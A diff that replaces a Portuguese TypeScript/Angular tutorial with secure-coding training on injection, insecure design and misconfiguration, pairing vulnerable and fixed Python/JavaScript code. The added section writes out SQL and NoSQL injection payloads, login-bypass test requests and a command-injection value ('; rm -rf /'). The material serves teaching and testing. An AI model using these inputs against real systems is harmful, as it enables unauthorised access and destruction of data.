-│    @Output() clicked = new    ← Emite para pai              │
-│      EventEmitter();                                        │
-│                                                              │
-│    @HostListener('click')    ← Escuta evento do host       │
-│    onClick() { ... }                                        │
-│  }                                                           │
-│                                                              │
-│  Angular usa decorators para:                                │
-│  • Registrar componente no sistema                          │
-│  • Configurar metadados                                     │
-│  • Habilitar DI                                             │
-│  • Configurar lifecycle hooks                               │
-└─────────────────────────────────────────────────────────────┘
+SOLUÇÃO: Usar Prepared Statements / Parametrized Queries
 ```
 
-**Exemplo Prático Completo**:
+#### Exemplos Práticos
 
-```typescript
-class User {
-  private id: number;
-  public name: string;
-  protected email: string;
-  public readonly createdAt: Date;
+**Exemplo 1: SQL Injection Clássica**
 
-  constructor(id: number, name: string, email: string) {
-    this.id = id;
-    this.name = name;
-    this.email = email;
-    this.createdAt = new Date();
-  }
+```python
+# ❌ VULNERÁVEL - Concatenação de strings
+def get_user(username):
+    query = f"SELECT * FROM users WHERE username = '{username}'"
+    return db.execute(query)
 
-  greet(): string {
-    return `Olá, eu sou ${this.name}`;
-  }
-
-  getId(): number {
-    return this.id;
-  }
-}
-
-class Admin extends User {
-  private permissions: string[];
-
-  constructor(
-    id: number,
-    name: string,
-    email: string,
-    permissions: string[]
-  ) {
-    super(id, name, email);
-    this.permissions = permissions;
-  }
-
-  hasPermission(permission: string): boolean {
-    return this.permissions.includes(permission);
-  }
-
-  override greet(): string {
-    return `Olá, eu sou ${this.name}, administrador`;
-  }
-}
-
-class UserService {
-  private users: User[] = [];
-
-  addUser(user: User): void {
-    this.users.push(user);
-  }
-
-  getUserById(id: number): User | undefined {
-    return this.users.find(u => u.getId() === id);
-  }
-}
-
-import { Component, Input, Output, EventEmitter } from '@angular/core';
-
-@Component({
-  selector: 'app-user',
-  template: '<div>{{user.name}}</div>'
-})
-export class UserComponent {
-  @Input() user!: User;
-  @Output() userSelected = new EventEmitter<User>();
-
-  onSelect(): void {
-    this.userSelected.emit(this.user);
-  }
-}
+# Ataque possível:
+# username = "admin' OR '1'='1' --"
+# Query executada: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
+# Resultado: Retorna TODOS os usuários!
 ```
 
-**Abstract Classes**:
+```python
+# ✅ SEGURO - Prepared Statements
+def get_user(username):
+    query = "SELECT * FROM users WHERE username = ?"
+    return db.execute(query, (username,))
 
-Classes abstratas não podem ser instanciadas diretamente, apenas estendidas:
-
-```typescript
-abstract class Animal {
-  abstract makeSound(): void;
-  
-  move(): void {
-    console.log("Moving...");
-  }
-}
-
-class Dog extends Animal {
-  makeSound(): void {
-    console.log("Woof!");
-  }
-}
+# Mesmo com ataque:
+# username = "admin' OR '1'='1' --"
+# Query busca literalmente por um usuário com esse nome (que não existe)
+# Resultado: Nenhum usuário retornado ✅
 ```
 
----
-
-### Generics
-
-**Definição**: Generics permitem criar componentes reutilizáveis que funcionam com múltiplos tipos, mantendo type safety. Eles permitem que você escreva código que funciona com qualquer tipo, mas ainda mantém informações de tipo específicas.
-
-**Explicação Detalhada**:
-
-Generics são fundamentais em Angular para:
-- **Serviços genéricos**: Serviços que funcionam com qualquer tipo de entidade
-- **Componentes reutilizáveis**: Componentes que podem trabalhar com diferentes tipos de dados
-- **Funções utilitárias**: Funções que mantêm type safety independente do tipo usado
-- **Tipos flexíveis mas seguros**: Código genérico sem perder verificação de tipos
-- **APIs tipadas**: Criar APIs que são flexíveis mas ainda type-safe
-
-**Como Generics Funcionam**:
-
-Generics usam parâmetros de tipo (type parameters) representados por letras como `T`, `U`, `V` ou nomes descritivos:
-
-```typescript
-function identity<T>(arg: T): T {
-  return arg;
-}
-```
-
-Aqui, `T` é um tipo variável que será substituído por um tipo real quando a função for chamada.
-
-**Constraints em Generics**:
-
-Você pode restringir quais tipos podem ser usados com `extends`:
-
-```typescript
-interface HasId {
-  id: number;
-}
-
-function getById<T extends HasId>(items: T[], id: number): T | undefined {
-  return items.find(item => item.id === id);
-}
-```
-
-**Analogia Detalhada**:
-
-Generics são como uma máquina de embalagem universal em uma fábrica. A máquina sabe como embalar qualquer tipo de produto, mas mantém informações específicas sobre cada produto:
-
-- **Sem Generics**: É como ter uma máquina que só embala maçãs. Se você quiser embalar laranjas, precisa de outra máquina completamente diferente.
-
-- **Com Generics**: É como ter uma máquina universal que pode embalar qualquer fruta. Quando você coloca maçãs, ela sabe que está embalando maçãs e ajusta o processo. Quando você coloca laranjas, ela sabe que são laranjas e ajusta de forma diferente. Mas em ambos os casos, você tem garantia de que o produto embalado é do mesmo tipo que você colocou.
-
-**Visualização Detalhada**:
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│              Função Genérica (Template)                      │
-├─────────────────────────────────────────────────────────────┤
-│                                                              │
-│  function getValue<T>(value: T): T {                        │
-│    return value;                                            │
-│  }                                                           │
-│                                                              │
-│  ┌──────────────────────────────────────────────────────┐  │
-│  │  Uso com Tipos Específicos                           │  │
-│  │                                                       │  │
-│  │  getValue<string>("Hello")                           │  │
-│  │    T = string                                        │  │
-│  │    → (value: string): string                        │  │
-│  │                                                       │  │
-│  │  getValue<number>(42)                                │  │
-│  │    T = number                                        │  │
-│  │    → (value: number): number                        │  │
-│  │                                                       │  │
-│  │  getValue<User>(user)                                │  │
-│  │    T = User                                          │  │
-│  │    → (value: User): User                            │  │
-│  └──────────────────────────────────────────────────────┘  │
-│                                                              │
-└─────────────────────────────────────────────────────────────┘
-
-Generics com Constraints:
-
-┌─────────────────────────────────────────────────────────────┐
-│  interface Identifiable {                                    │
-│    id: number;                                               │
-│  }                                                           │
-│                                                              │
-│  function findById<T extends Identifiable>(                  │
-│    items: T[],                                               │
-│    id: number                                                │
-│  ): T | undefined {                                          │
-│    return items.find(item => item.id === id);               │
-│  }                                                           │
-│                                                              │
-│  ✓ findById<User>(users, 1)     ← User tem 'id'             │
-│  ✓ findById<Product>(products, 1) ← Product tem 'id'        │
-│  ✗ findById<string>(strings, 1) ← string não tem 'id'      │
-└─────────────────────────────────────────────────────────────┘
-```
-
-**Exemplo Prático Completo**:
-
-```typescript
-interface Repository<T> {
-  findById(id: number): T | null;
-  findAll(): T[];
-  save(entity: T): T;
-}
-
-interface Identifiable {
-  id: number;
-}
-
-class GenericRepository<T extends Identifiable> implements Repository<T> {
-  private items: T[] = [];
-
-  findById(id: number): T | null {
-    return this.items.find(item => item.id === id) || null;
-  }
-
-  findAll(): T[] {
-    return [...this.items];
-  }
-
-  save(entity: T): T {
-    const existingIndex = this.items.findIndex(item => item.id === entity.id);
-    if (existingIndex !== -1) {
-      this.items[existingIndex] = entity;
-    } else {
-      this.items.push(entity);
-    }
-    return entity;
-  }
-}
-
-function getValue<T>(value: T): T {
-  return value;
-}
-
-function map<T, U>(array: T[], fn: (item: T) => U): U[] {
-  return array.map(fn);
-}
-
-const userRepository = new GenericRepository<User>();
-const productRepository = new GenericRepository<Product>();
-
-const stringValue = getValue<string>("Hello");
-const numberValue = getValue<number>(42);
-
-const doubled = map<number, number>([1, 2, 3], n => n * 2);
-const names = map<User, string>(users, user => user.name);
-```
-
----
-
-### Módulos ES6 e Organização
-
-**Definição**: Módulos ES6 permitem organizar código em arquivos separados e importar/exportar funcionalidades entre eles.
-
-**Explicação Detalhada**:
-
-Em Angular, módulos são essenciais para:
-- Organizar código em arquivos
-- Reutilizar código entre componentes
-- Gerenciar dependências
-- Facilitar manutenção
-
-**Analogia**:
-
-Módulos são como capítulos de um livro. Cada capítulo (módulo) contém informações específicas, mas você pode referenciar outros capítulos quando necessário. Isso mantém o livro organizado e fácil de navegar.
-
-**Visualização**:
-
-```
-user.service.ts              app.component.ts
-┌─────────────────┐          ┌─────────────────┐
-│ export class    │          │ import { User   │
-│   UserService   │          │   Service }     │
-│ { ... }         │          │   from './user  │
-└─────────────────┘          │   .service'     │
-                             │                 │
-                             └─────────────────┘
-```
-
-**Exemplo Prático**:
-
-```typescript
-user.service.ts
-export class UserService {
-  getUsers(): User[] {
-    return [];
-  }
-}
-
-export interface User {
-  id: number;
-  name: string;
-}
-
-app.component.ts
-import { Component } from '@angular/core';
-import { UserService, User } from './user.service';
-
-@Component({
-  selector: 'app-root',
-  templateUrl: './app.component.html'
-})
-export class AppComponent {
-  constructor(private userService: UserService) {}
-}
-```
-
----
-
-## Comparação com Outras Linguagens e Tecnologias
-
-### TypeScript vs JavaScript
-
-**Tabela Comparativa Detalhada**:
-
-| Aspecto | JavaScript | TypeScript |
-|---------|------------|------------|
-| **Tipagem** | Dinâmica (runtime) | Estática (compile-time) |
-| **Verificação de Erros** | Runtime | Compile-time |
-| **Interfaces** | Não suportado | Suportado |
-| **Classes** | ES6+ (sem tipagem) | Suportado com tipagem completa |
-| **Generics** | Não suportado | Suportado |
-| **Decorators** | Stage 3 proposal | Suportado (experimental) |
-| **Compilação** | Não requer | Requer (transpila para JS) |
-| **Autocomplete** | Limitado | Avançado (baseado em tipos) |
-| **Refatoração** | Manual e arriscado | Seguro e automatizado |
-| **Documentação** | Externa necessária | Tipos servem como documentação |
-| **Bundle Size** | Menor | Similar (remove tipos em produção) |
-| **Performance Runtime** | Idêntica | Idêntica (mesmo código gerado) |
-| **Curva de Aprendizado** | Mais baixa | Moderada (requer aprender tipos) |
-| **Adoção** | Universal | Crescente (especialmente Angular) |
-
-**Quando Usar Cada Um**:
-
-- **JavaScript**: Projetos pequenos, prototipagem rápida, scripts simples
-- **TypeScript**: Projetos grandes, equipes grandes, aplicações complexas, Angular
-
-### TypeScript vs Outras Linguagens Tipadas
-
-**Comparação com Linguagens de Tipagem Estática**:
-
-| Aspecto | TypeScript | Java | C# | Dart |
-|---------|------------|------|----|----|
-| **Paradigma** | Multi-paradigma | OOP | Multi-paradigma | OOP |
-| **Tipagem** | Gradual (opcional) | Estrita | Estrita | Estrita |
-| **Compilação** | Transpila para JS | Compila para bytecode | Compila para IL | Compila para JS/nativo |
-| **Runtime** | JavaScript | JVM | .NET | Dart VM/JS |
-| **Null Safety** | Opcional (strict) | Sim | Sim | Sim |
-| **Generics** | Sim | Sim | Sim | Sim |
-| **Interfaces** | Sim | Sim | Sim | Sim |
-| **Type Inference** | Sim | Limitado | Sim | Sim |
-| **Ecossistema** | JavaScript | Java | .NET | Dart/Flutter |
-
-**Vantagens do TypeScript**:
-
-1. **Compatibilidade Total com JavaScript**: Qualquer código JavaScript válido é TypeScript válido
-2. **Ecossistema JavaScript**: Acesso a toda biblioteca npm existente
-3. **Tipagem Gradual**: Pode adicionar tipos progressivamente
-4. **Desenvolvimento Web Nativo**: Feito especificamente para desenvolvimento web
-5. **Ferramentas Maduras**: Excelente suporte em IDEs
-
-**Desvantagens Comparativas**:
-
-1. **Performance**: Não melhora performance runtime (mesmo código gerado)
-2. **Tipagem Opcional**: Pode ser ignorada (diferente de linguagens estritamente tipadas)
-3. **Compilação Necessária**: Requer passo de build adicional
-
-### TypeScript vs Alternativas de Tipagem para JavaScript
-
-**Comparação com Flow e JSDoc**:
-
-| Aspecto | TypeScript | Flow | JSDoc |
-|---------|-----------|------|-------|
-| **Desenvolvido por** | Microsoft | Facebook | Comunidade |
-| **Tipagem** | Estática | Estática | Anotações de comentário |
-| **Integração** | Linguagem própria | Extensão JS | Comentários |
-| **Adoção** | Muito alta | Declinando | Estável |
-| **Suporte Angular** | Nativo | Não | Não |
-| **Suporte React** | Excelente | Nativo | Limitado |
-| **Curva de Aprendizado** | Moderada | Moderada | Baixa |
-| **Ferramentas** | Excelentes | Boas | Limitadas |
-
-**Por que TypeScript Ganhou**:
-
-1. **Suporte Oficial**: Adotado por Angular, recomendado por React
-2. **Ecossistema**: Maior comunidade e bibliotecas tipadas
-3. **Ferramentas**: Melhor suporte em IDEs
-4. **Padrão da Indústria**: Tornou-se padrão para desenvolvimento web moderno
-
-### Visualização Comparativa
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│              Ecossistema de Linguagens Web                   │
-├─────────────────────────────────────────────────────────────┤
-│                                                              │
-│  JavaScript Puro                                             │
-│  ┌──────────────┐                                           │
-│  │ Sem Tipos    │  ← Flexível, mas arriscado                │
-│  │ Runtime      │                                           │
-│  └──────────────┘                                           │
-│         │                                                    │
-│         ├──────────────────────────────────────┐          │
-│         │                                        │          │
-│  ┌──────▼──────┐                        ┌──────▼──────┐   │
-│  │ TypeScript  │                        │    Flow     │   │
-│  │             │                        │             │   │
-│  │ ✓ Angular   │                        │ ✓ React     │   │
-│  │ ✓ Padrão    │                        │ ✗ Declinando│  │
-│  │ ✓ Maduro    │                        │             │   │
-│  └─────────────┘                        └─────────────┘   │
-│                                                              │
-│  Linguagens Compiladas                                      │
-│  ┌──────────────┐  ┌──────────────┐                        │
-│  │     Dart     │  │   Kotlin JS  │                        │
-│  │   (Flutter)  │  │              │                        │
-│  └──────────────┘  └──────────────┘                        │
-│                                                              │
-└─────────────────────────────────────────────────────────────┘
-
-Adoção no Mercado (2024):
-
-TypeScript:  ████████████████████ 85%
-Flow:        ██ 8%
-JSDoc:       ████ 15%
-Dart Web:    ██ 5%
-Outros:      ██ 7%
-```
-
----
-
-## Exemplos Práticos Completos
-
-### Exemplo 1: Sistema de Tipos Completo
-
-**Contexto**: Criar um sistema de tipos completo para uma aplicação de usuários.
-
-**Código**:
-
-```typescript
-interface BaseEntity {
-  id: number;
-  createdAt: Date;
-  updatedAt: Date;
-}
-
-interface User extends BaseEntity {
-  name: string;
-  email: string;
-  age: number;
-  isActive: boolean;
-}
-
-class UserService {
-  private users: User[] = [];
-
-  createUser(userData: Omit<User, 'id' | 'createdAt' | 'updatedAt'>): User {
-    const newUser: User = {
-      ...userData,
-      id: this.users.length + 1,
-      createdAt: new Date(),
-      updatedAt: new Date()
+**Exemplo 2: NoSQL Injection**
+
+```javascript
+// ❌ VULNERÁVEL - Concatenação direta
+app.post('/api/login', (req, res) => {
+    const username = req.body.username;
+    const password = req.body.password;
+    
+    const query = {
+        username: username,
+        password: password
     };
-    this.users.push(newUser);
-    return newUser;
-  }
+    
+    User.findOne(query, (err, user) => {
+        // ...
+    });
+});
 
-  getUserById(id: number): User | undefined {
-    return this.users.find(user => user.id === id);
-  }
-
-  getAllUsers(): User[] {
-    return [...this.users];
-  }
-}
+// Ataque possível:
+// POST /api/login
+// {"username": {"$ne": null}, "password": {"$ne": null}}
+// Resultado: Retorna primeiro usuário encontrado (bypass de login)!
 ```
 
-**Explicação**:
-
-1. `BaseEntity` define propriedades comuns
-2. `User` estende `BaseEntity` adicionando propriedades específicas
-3. `UserService` usa tipos para garantir type safety
-4. `Omit` utility type remove propriedades desnecessárias
-
----
-
-### Exemplo 2: Generics em Ação
-
-**Contexto**: Criar um serviço genérico de repositório que funciona com qualquer entidade.
-
-**Código**:
-
-```typescript
-interface Identifiable {
-  id: number;
-}
-
-class Repository<T extends Identifiable> {
-  private items: T[] = [];
-
-  findById(id: number): T | undefined {
-    return this.items.find(item => item.id === id);
-  }
-
-  findAll(): T[] {
-    return [...this.items];
-  }
-
-  save(item: Omit<T, 'id'> & { id?: number }): T {
-    const newItem = {
-      ...item,
-      id: item.id || this.items.length + 1
-    } as T;
-    this.items.push(newItem);
-    return newItem;
-  }
-
-  delete(id: number): boolean {
-    const index = this.items.findIndex(item => item.id === id);
-    if (index !== -1) {
-      this.items.splice(index, 1);
-      return true;
+```javascript
+// ✅ SEGURO - Validação e sanitização
+app.post('/api/login', (req, res) => {
+    const username = String(req.body.username);  // Força string
+    const password = String(req.body.password);  // Força string
+    
+    // Validação adicional
+    if (typeof username !== 'string' || username.length === 0) {
+        return res.status(400).json({error: 'Invalid username'});
     }
-    return false;
-  }
+    
+    const query = {
+        username: username,
+        password: password
+    };
+    
+    User.findOne(query, (err, user) => {
+        // ...
+    });
+});
+```
+
+**Exemplo 3: Command Injection**
+
+```python
+# ❌ VULNERÁVEL - Execução direta de comando
+import os
+
+def ping_host(hostname):
+    result = os.system(f"ping -c 4 {hostname}")  # Perigoso!
+    return result
+
+# Ataque possível:
+# hostname = "google.com; rm -rf /"
+# Resultado: Executa comando malicioso!
+```
+
+```python
+# ✅ SEGURO - Validação e subprocess
+import subprocess
+import re
+
+def ping_host(hostname):
+    # Validação de entrada
+    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
+        raise ValueError('Invalid hostname')
+    
+    # Usa subprocess com lista de argumentos
+    result = subprocess.run(['ping', '-c', '4', hostname], 
+                          capture_output=True, text=True)
+    return result.stdout
+```
+
+#### Contexto CWI - Casos Reais
+
+**Caso Financeiro (Fintech)**:
+Em um dos projetos financeiros da CWI, identificamos SQL Injection em endpoint de consulta de extratos. A correção usando prepared statements evitou exposição de dados bancários de 500k+ usuários.
+
+**Caso Ecommerce**:
+Em uma plataforma de ecommerce, NoSQL Injection permitia bypass de autenticação. A correção implementou validação rigorosa de tipos e sanitização de entrada.
+
+#### Como Testar
+
+**Checklist de Testes**:
+- [ ] Testar SQL Injection em todos os campos de entrada
+- [ ] Tentar NoSQL Injection em APIs que usam MongoDB
+- [ ] Testar Command Injection em funcionalidades que executam comandos
+- [ ] Validar se prepared statements são usados em todas as queries
+- [ ] Verificar sanitização de entrada em todos os endpoints
+
+**Exemplo de Teste Manual**:
+```bash
+# 1. Teste SQL Injection básico
+POST /api/login
+{"username": "admin' OR '1'='1", "password": "anything"}
+# ❌ Se retornar sucesso, é vulnerável
+
+# 2. Teste SQL Injection com comentário
+POST /api/search
+{"query": "test' --"}
+# ❌ Se executar sem erro, pode ser vulnerável
+
+# 3. Teste NoSQL Injection
+POST /api/users
+{"username": {"$ne": null}, "email": {"$ne": null}}
+# ❌ Se retornar dados, é vulnerável
+```
+
+#### Prevenção
+
+**Boas Práticas**:
+1. **SEMPRE use Prepared Statements**: Separa código de dados
+2. **Validação de Entrada**: Valide e sanitize TODOS os inputs
+3. **Princípio do Menor Privilégio**: Banco de dados com permissões mínimas
+4. **ORM Seguro**: Use ORMs que previnem injection automaticamente
+5. **Whitelist vs Blacklist**: Prefira whitelist (permitir apenas o válido)
+
+---
+
+### 4. Insecure Design
+
+#### 🎭 Analogia: A Casa com Fundação Fraca
+
+Imagine construir uma casa.
+
+**Cenário Seguro**:
+- Você projeta a fundação forte desde o início ✅
+- A casa é segura por design ✅
+
+**Cenário Vulnerável (Insecure Design)**:
+- Você constrói sem planejar a segurança ❌
+- Depois tenta adicionar segurança como remendo ❌
+- A fundação continua fraca ❌
+
+Na segurança de software, isso acontece quando o design não considera segurança desde o início.
+
+#### Definição Técnica
+
+**Insecure Design** é uma categoria focada em riscos relacionados a falhas de design e arquitetura. Diferente de "Security Misconfiguration", aqui o problema está na concepção inicial, não na implementação.
+
+#### Exemplos de Insecure Design
+
+| Problema | Descrição | Impacto |
+|----------|-----------|---------|
+| **Falta de Threat Modeling** | Não identifica ameaças no design | Alto - Vulnerabilidades não previstas |
+| **Autenticação fraca por design** | Sistema permite senhas fracas | Crítico - Acesso não autorizado |
+| **Falta de rate limiting** | Não limita tentativas de login | Alto - Ataques de força bruta |
+| **Arquitetura sem isolamento** | Componentes compartilham recursos | Alto - Escalação de privilégios |
+| **Falta de validação de negócio** | Regras de negócio não validadas | Médio - Fraudes e abusos |
+
+#### Exemplos Práticos
+
+**Exemplo 1: Falta de Rate Limiting**
+
+```python
+# ❌ VULNERÁVEL - Sem rate limiting
+@app.route('/api/login', methods=['POST'])
+def login():
+    username = request.json['username']
+    password = request.json['password']
+    
+    user = authenticate(username, password)
+    if user:
+        return {'token': generate_token(user)}
+    else:
+        return {'error': 'Invalid credentials'}, 401
+
+# Ataque possível: Força bruta sem limites
+# Tentativas ilimitadas de login
+```
+
+```python
+# ✅ SEGURO - Rate limiting implementado
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+
+limiter = Limiter(app, key_func=get_remote_address)
+
+@app.route('/api/login', methods=['POST'])
+@limiter.limit("5 per minute")  # Máximo 5 tentativas por minuto
+def login():
+    username = request.json['username']
+    password = request.json['password']
+    
+    user = authenticate(username, password)
+    if user:
+        return {'token': generate_token(user)}
+    else:
+        return {'error': 'Invalid credentials'}, 401
+```
+
+**Exemplo 2: Validação de Negócio Faltando**
+
+```python
+# ❌ VULNERÁVEL - Não valida regras de negócio
+@app.route('/api/transfer', methods=['POST'])
+def transfer():
+    from_account = request.json['from_account']
+    to_account = request.json['to_account']
+    amount = request.json['amount']
+    
+    # Não valida se usuário é dono da conta origem
+    # Não valida limites de transferência
+    # Não valida se conta destino existe
+    
+    transfer_money(from_account, to_account, amount)
+    return {'success': True}
+
+# Ataque possível: Transferir dinheiro de qualquer conta
+```
+
+```python
+# ✅ SEGURO - Validação completa de negócio
+@app.route('/api/transfer', methods=['POST'])
+@require_auth
+def transfer():
+    current_user_id = session['user_id']
+    from_account = request.json['from_account']
+    to_account = request.json['to_account']
+    amount = float(request.json['amount'])
+    
+    # Validação 1: Usuário é dono da conta origem
+    account = db.get_account(from_account)
+    if account.user_id != current_user_id:
+        return {'error': 'Unauthorized'}, 403
+    
+    # Validação 2: Conta destino existe
+    if not db.account_exists(to_account):
+        return {'error': 'Destination account not found'}, 404
+    
+    # Validação 3: Saldo suficiente
+    if account.balance < amount:
+        return {'error': 'Insufficient funds'}, 400
+    
+    # Validação 4: Limite de transferência
+    if amount > account.transfer_limit:
+        return {'error': 'Amount exceeds transfer limit'}, 400
+    
+    # Validação 5: Não permite transferência para si mesmo
+    if from_account == to_account:
+        return {'error': 'Cannot transfer to same account'}, 400
+    
+    transfer_money(from_account, to_account, amount)
+    return {'success': True}
+```
+
+#### Contexto CWI - Casos Reais
+
+**Caso Financeiro (Open Banking)**:
+Em um projeto de Open Banking, o design inicial não considerava rate limiting adequado. Implementamos throttling por API key e por IP para prevenir abusos e garantir compliance.
+
+**Caso Ecommerce**:
+Em uma plataforma de ecommerce, o design não previa validação de estoque em tempo real. Implementamos validação transacional para prevenir overselling.
+
+#### Como Testar
+
+**Checklist de Testes**:
+- [ ] Verificar se há rate limiting em endpoints críticos
+- [ ] Testar validação de regras de negócio
+- [ ] Validar isolamento entre usuários/recursos
+- [ ] Verificar se autenticação é forte por design
+- [ ] Testar cenários de abuso e fraude
+
+#### Prevenção
+
+**Boas Práticas**:
+1. **Threat Modeling**: Identificar ameaças no design
+2. **Security by Design**: Considerar segurança desde o início
+3. **Validação de Negócio**: Implementar todas as regras de negócio
+4. **Rate Limiting**: Limitar tentativas e requisições
+5. **Isolamento**: Isolar recursos entre usuários/tenants
+
+---
+
+### 5. Security Misconfiguration
+
+#### 🎭 Analogia: A Casa com Portas Abertas
+
+Imagine uma casa com todas as portas e janelas abertas.
+
+**Cenário Seguro**:
+- Portas trancadas ✅
+- Janelas fechadas ✅
+- Sistema de alarme ativado ✅
+
+**Cenário Vulnerável (Security Misconfiguration)**:
+- Portas abertas ❌
+- Janelas abertas ❌
+- Sistema de alarme desativado ❌
+- Chaves deixadas na porta ❌
+
+Na segurança de software, isso acontece quando configurações padrão inseguras são mantidas ou configurações de segurança não são aplicadas corretamente.
+
+#### Definição Técnica
+
+**Security Misconfiguration** ocorre quando componentes de segurança não são configurados corretamente, deixando a aplicação vulnerável. Isso inclui configurações padrão inseguras, mensagens de erro detalhadas, serviços desnecessários habilitados, etc.
+
+#### Tipos Comuns de Misconfiguration
+
+| Tipo | Descrição | Impacto |
+|------|-----------|---------|
+| **Configurações padrão** | Senhas padrão, contas padrão | Crítico - Acesso não autorizado |
+| **Mensagens de erro detalhadas** | Stack traces expostos | Médio - Informação para atacantes |
+| **Serviços desnecessários** | Portas abertas, serviços habilitados | Alto - Superfície de ataque maior |
+| **Headers de segurança ausentes** | Sem CSP, HSTS, etc. | Médio - Vulnerável a XSS, MITM |
+| **Permissões excessivas** | Arquivos/diretórios com permissões erradas | Alto - Acesso não autorizado |
+
+#### Exemplos Práticos
+
+**Exemplo 1: Mensagens de Erro Detalhadas**
+
+```python
+# ❌ VULNERÁVEL - Stack trace exposto
+@app.route('/api/users/<user_id>')
+def get_user(user_id):
+    try:
+        user = db.get_user(user_id)
+        return jsonify(user)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500  # Expõe detalhes internos!
+
+# Erro retornado:
+# {"error": "FileNotFoundError: /var/db/users.db at line 123"}
+# Atacante descobre estrutura interna!
+```
+
+```python
+# ✅ SEGURO - Mensagens genéricas em produção
+import logging
+
+@app.route('/api/users/<user_id>')
+def get_user(user_id):
+    try:
+        user = db.get_user(user_id)
+        return jsonify(user)
+    except Exception as e:
+        # Log detalhado apenas no servidor
+        logging.error(f"Error getting user {user_id}: {str(e)}")
+        
+        # Mensagem genérica para cliente
+        if app.config['DEBUG']:
+            return jsonify({'error': str(e)}), 500
+        else:
+            return jsonify({'error': 'Internal server error'}), 500
+```
+
+**Exemplo 2: Headers de Segurança Ausentes**
+
+```python
+# ❌ VULNERÁVEL - Sem headers de segurança
+from flask import Flask
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return '<h1>Hello World</h1>'
+
+# Sem proteção contra XSS, clickjacking, etc.
+```
+
+```python
+# ✅ SEGURO - Headers de segurança configurados
+from flask import Flask
+from flask_talisman import Talisman
+
+app = Flask(__name__)
+
+# Configura headers de segurança automaticamente
+Talisman(app, 
+    force_https=True,
+    strict_transport_security=True,
+    content_security_policy={
+        'default-src': "'self'",
+        'script-src': "'self' 'unsafe-inline'",
+    }
+)
+
+@app.route('/')
+def index():
+    return '<h1>Hello World</h1>'
+
+# Agora tem:
+# - HSTS (HTTP Strict Transport Security)
+# - CSP (Content Security Policy)
+# - X-Frame-Options
+# - X-Content-Type-Options
+```
+
+**Exemplo 3: Configurações Padrão Inseguras**
+
+```python
+# ❌ VULNERÁVEL - Credenciais padrão
+DATABASE_CONFIG = {
+    'host': 'localhost',
+    'user': 'admin',      # Usuário padrão
+    'password': 'admin',  # Senha padrão!
+    'database': 'app_db'
 }
 
-const userRepository = new Repository<User>();
-const productRepository = new Repository<Product>();
+# Qualquer um que conheça o padrão pode acessar!
 ```
 
-**Explicação**:
+```python
+# ✅ SEGURO - Credenciais de variáveis de ambiente
+import os
 
-1. `Repository<T>` é genérico e funciona com qualquer tipo que tenha `id`
-2. `extends Identifiable` garante que T tenha a propriedade `id`
-3. Cada instância do repositório trabalha com um tipo específico
-4. Type safety é mantido em todas as operações
+DATABASE_CONFIG = {
+    'host': os.getenv('DB_HOST', 'localhost'),
+    'user': os.getenv('DB_USER'),      # Obrigatório
+    'password': os.getenv('DB_PASSWORD'),  # Obrigatório
+    'database': os.getenv('DB_NAME', 'app_db')
+}
 
----
+# Validação
+if not DATABASE_CONFIG['user'] or not DATABASE_CONFIG['password']:
+    raise ValueError('Database credentials must be set via environment variables')
+```
 
-## Padrões e Boas Práticas
+#### Contexto CWI - Casos Reais
 
-### ✅ Boas Práticas
+**Caso Geral**:
+Em vários projetos CWI, identificamos que ambientes de desenvolvimento expunham stack traces detalhados. Implementamos configuração diferenciada por ambiente, com mensagens genéricas em produção.
 
-1. **Sempre use tipos explícitos em funções públicas**
-   - **Por quê**: Melhora legibilidade, previne erros e serve como documentação
-   - **Exemplo Bom**:
-```
-     function getUser(id: number): User | null {
-       return users.find(u => u.id === id) || null;
-     }
-```
-   - **Exemplo Ruim**:
-```
-     function getUser(id) {
-       return users.find(u => u.id === id) || null;
-     }
-```
-   - **Benefícios**: Autocomplete melhor, erros detectados mais cedo, código auto-documentado
+**Caso Cloud**:
+Em um projeto hospedado na AWS, buckets S3 estavam configurados como públicos por padrão. Corrigimos para privados com acesso controlado via IAM.
 
-2. **Use interfaces para estruturas de dados**
-   - **Por quê**: Facilita manutenção, reutilização e garante consistência
-   - **Exemplo Bom**:
-```
-     interface User {
-       id: number;
-       name: string;
-       email: string;
-     }
-     
-     function createUser(data: User): User {
-       return { ...data };
-     }
-```
-   - **Exemplo Ruim**:
-```
-     function createUser(data: { id: number; name: string; email: string }): any {
-       return data;
-     }
-```
-   - **Benefícios**: Reutilização, consistência, fácil refatoração
+#### Como Testar
 
-3. **Evite `any` quando possível - use `unknown`**
-   - **Por quê**: `any` desabilita type checking completamente, `unknown` força verificação
-   - **Exemplo Bom**:
-```
-     function processValue(value: unknown): void {
-       if (typeof value === "string") {
-         console.log(value.toUpperCase());
-       } else if (typeof value === "number") {
-         console.log(value.toFixed(2));
-       }
-     }
-```
-   - **Exemplo Ruim**:
-```
-     function processValue(value: any): void {
-       console.log(value.toUpperCase());
-     }
-```
-   - **Benefícios**: Type safety mantido, erros detectados em compile-time
+**Checklist de Testes**:
+- [ ] Verificar se não há credenciais padrão
+- [ ] Testar se mensagens de erro não expõem detalhes
+- [ ] Validar headers de segurança (CSP, HSTS, etc.)
+- [ ] Verificar se serviços desnecessários estão desabilitados
+- [ ] Testar permissões de arquivos e diretórios
 
-4. **Use generics para código reutilizável**
-   - **Por quê**: Mantém type safety em código genérico, evita duplicação
-   - **Exemplo Bom**:
-```
-     class Repository<T extends Identifiable> {
-       findById(id: number): T | undefined {
-         return this.items.find(item => item.id === id);
-       }
-     }
-```
-   - **Exemplo Ruim**:
-```
-     class UserRepository {
-       findById(id: number): any {
-         return this.users.find(u => u.id === id);
-       }
-     }
-```
-   - **Benefícios**: Reutilização sem perder type safety
+**Exemplo de Teste**:
+```bash
+# 1. Verificar headers de segurança
+curl -I https://api.example.com
+# Deve ter:
+# - Strict-Transport-Security
+# - Content-Security-Policy
+# - X-Frame-Options
 
-5. **Use utility types para transformações de tipo**
-   - **Por quê**: Cria tipos derivados de forma segura e expressiva
-   - **Exemplo Bom**:
-```
-     interface User {
-       id: number;
-       name: string;
-       email: string;
-       password: string;
-     }
-     
-     type CreateUserDto = Omit<User, 'id'>;
-     type UpdateUserDto = Partial<Pick<User, 'name' | 'email'>>;
-     type PublicUser = Omit<User, 'password'>;
-```
-   - **Benefícios**: Tipos seguros para diferentes operações, evita duplicação
